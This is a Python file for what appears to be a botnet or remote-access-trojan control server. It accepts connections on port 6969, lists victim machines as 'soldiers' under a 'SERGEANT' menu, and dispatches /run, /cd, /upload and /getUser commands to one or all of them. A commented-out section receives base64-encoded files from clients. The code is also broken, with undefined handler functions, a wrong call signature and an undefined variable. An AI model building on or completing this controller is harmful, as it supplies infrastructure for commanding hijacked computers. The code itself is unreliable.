import socket
from  _thread import *
import sys
import select
import base64
import getpass
import os

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = ''
port = 6969
server.bind((host,port))
server.listen(100)
buff_size = 4096
list_of_clients = []
operating_system = sys.platform
commands = {
            '/cd' : cd,
            '/run' : run,
            '/initiate' : initiate,
            '/upload' : upload,
            '/getUser' : getName
            }
def clear():
    if operating_system.startswith('win32'):
        os.system('cls')
    elif operating_system.startswith('darwin') or operating_system.startswith('linux'):
        os.system('clear')

def clientthread(conn, addr):
    name = getName(conn)
    list_of_clients.append({'conn' : conn, 'addr' : addr, 'name' : name})
    # conn.send('/initiate')
    #
    # try:
    #     file_name = conn.rec(2048)
    #     file_name = file_name[9:]
    #     while file_name is not 'end_file':
    #         data = ''
    #             while data:
    #                 data = data + conn.recv(buff_size)
    #             with open('clients/{}/{}'.format(user,file_name), 'a') as f:
    #                 f.write(base64.b64decode(data))
    #             file_name = conn.rec(2048)
    #             file_name = file_name[9:]

    # except:
    #     print('An Error Occured')

def getName(conn,msg):
    conn.send('/getUser'.encode())
    name = conn.recv(4096)
    return name.decode()

def getConn():
    while True:
        conn, addr = server.accept()
        start_new_thread(clientthread,(conn,addr))

def start():

    clear()
    choice = input("WELCOME BACK,\nSERGEANT,\n1. SELECT A SOLDIER TO COMMAND\n2. COMMAND ALL OF 'EM\n3.EXIT\n>>")

    if choice is '1':

        clear()

        print('RANK\tNAME')
        for c,soldier in enumerate(list_of_clients):
            print('{}.\t{}'.format(c+1,soldier['name']))
        rank = input('ENTER RANK OF SOLDIER:')
        soldier = list_of_clients[int(rank)-1]
        command = input('ENTER COMMAND:')
        start_new_thread(sendCommand,(soldier,command))
        start()

    if choice is '2':

        clear()

        command = input('ENTER COMMAND:')
        for soldier in list_of_clients:
            start_new_thread(sendCommand,(soldier,command))
        start()

    if choice is '3':

        for soldier in list_of_clients:
            soldier['conn'].close()
        server.close()
        sys.exit(0)

def sendCommand(soldier, command):
    conn = soldier['conn']
    try:
        for key,value in commands.items():
            if msg.decode().startswith(key):
                func = value
                break
        if func:
            start_new_thread(func, (conn,command))
        else:
            print('NO SUCH COMMAND')
        print('[*] {} COMMANDED'.format(soldier['name']))
    except:
        print('[*] UNABLE TO COMMAND : {}'.format(soldier['name']))
        print('[*] TERMINATING SOLDIER : {}'.format(soldier['name']))
        conn.close()

start_new_thread(getConn,())
start()
